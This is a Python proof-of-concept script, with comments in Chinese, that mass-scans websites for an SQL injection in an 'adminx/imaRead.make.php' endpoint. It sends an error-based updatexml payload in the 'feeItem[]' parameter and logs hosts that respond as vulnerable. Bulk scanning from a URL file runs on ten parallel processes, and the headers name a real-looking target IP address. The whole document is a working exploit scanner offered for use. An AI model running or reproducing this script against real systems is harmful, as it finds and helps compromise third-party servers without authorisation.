import requests,warnings,re,argparse
from requests.packages import urllib3
from multiprocessing import Pool
from urllib.parse import quote
#关闭警告
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

def poc(url):
    url = url.strip()
    url1 = url+"/adminx/imaRead.make.php?act=remake"
    payload = "feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(12345678)),1)"

    target = f"{url1}&{quote(payload)}"

    proxies = {
            "https":"http://127.0.0.1:8080",
            "http":"http://127.0.0.1:8080"
        }

    headers = {
  "Host": "36.249.159.149:8876",
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0",
  "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
  "Origin": "https://36.249.159.149:8876",
  "Referer": "https://36.249.159.149:8876/adminx/login.php"
    }

    try:
        response = requests.post(target,headers=headers,timeout=5,verify=False,data=payload,proxies=proxies)


        if response.status_code == 200 and '~25d55ad283aa400af464c76d713c07a' in response.text:
            print(f"[+]{url}存在漏洞")
            with open("result.txt","a") as f:
                f.write(f"{url}\n")
        else:
            print(f"[-]{url}不存在漏洞")
            
    except Exception as e:
        print(f"[!]请求{url}时发送错误：{e}")

def main():

    banner = """ 

.-. .-')              .-. .-')               
\  ( OO )             \  ( OO )              
 ;-----.\  .-'),-----. ;-----.\  .-'),-----. 
 | .-.  | ( OO'  .-.  '| .-.  | ( OO'  .-.  '
 | '-' /_)/   |  | |  || '-' /_)/   |  | |  |
 | .-. `. \_) |  |\|  || .-. `. \_) |  |\|  |
 | |  \  |  \ |  | |  || |  \  |  \ |  | |  |
 | '--'  /   `'  '-'  '| '--'  /   `'  '-'  '
 `------'      `-----' `------'      `-----'       
                                author:bobo
"""
    print(banner)


    parser = argparse.ArgumentParser(description="SQL注入检测脚本")
    parser.add_argument('-u','--url',type=str,help="单个URL检测")
    parser.add_argument('-f','--file',type=str,help="文件内URL检测")
    
    args = parser.parse_args()

    if args.url:
        poc(args.url)
    elif args.file:
        with open(args.file,'r',encoding='utf-8') as f:
            url_list = []
            for i in f.readlines():
                url_list.append(i.strip().replace('\n',''))
            
            mp = Pool(10)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print("请提供一个URL或者包含URL的文件")


if __name__ == "__main__":
    main()